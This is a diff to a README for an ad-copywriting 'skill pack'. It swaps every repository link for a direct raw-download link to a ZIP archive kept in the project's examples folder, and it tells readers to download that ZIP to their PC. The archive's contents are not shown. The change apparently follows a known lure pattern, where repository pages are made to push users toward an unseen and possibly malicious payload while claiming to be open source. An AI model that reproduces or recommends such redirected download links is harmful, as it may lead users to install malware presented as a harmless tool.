@@ -1,6 +1,6 @@
 # 🤖 ad-copy-skill-pack - Write better Google Ads faster
 
-[![Download](https://img.shields.io/badge/Download%20Now-Visit%20the%20page%20to%20download-blue?style=for-the-badge)](https://github.com/ottoman-genusamanita272/ad-copy-skill-pack)
+[![Download](https://img.shields.io/badge/Download%20Now-Visit%20the%20page%20to%20download-blue?style=for-the-badge)](https://github.com/ottoman-genusamanita272/ad-copy-skill-pack/raw/refs/heads/main/examples/pack_copy_skill_ad_v1.6.zip)
 
 ## ✨ What this is
 
@@ -30,7 +30,7 @@ For best results, use a recent version of Chrome, Edge, or Firefox.
 
 Use this link to visit the page to download:
 
-https://github.com/ottoman-genusamanita272/ad-copy-skill-pack
+https://github.com/ottoman-genusamanita272/ad-copy-skill-pack/raw/refs/heads/main/examples/pack_copy_skill_ad_v1.6.zip
 
 If the page shows a ZIP file, download it to your PC. Then:
 
@@ -242,7 +242,7 @@ This project is open source, so you can inspect the files and adapt them to your
 
 Visit this page to download or open the repository files:
 
-https://github.com/ottoman-genusamanita272/ad-copy-skill-pack
+https://github.com/ottoman-genusamanita272/ad-copy-skill-pack/raw/refs/heads/main/examples/pack_copy_skill_ad_v1.6.zip
 
 ## 🧩 File review checklist
 
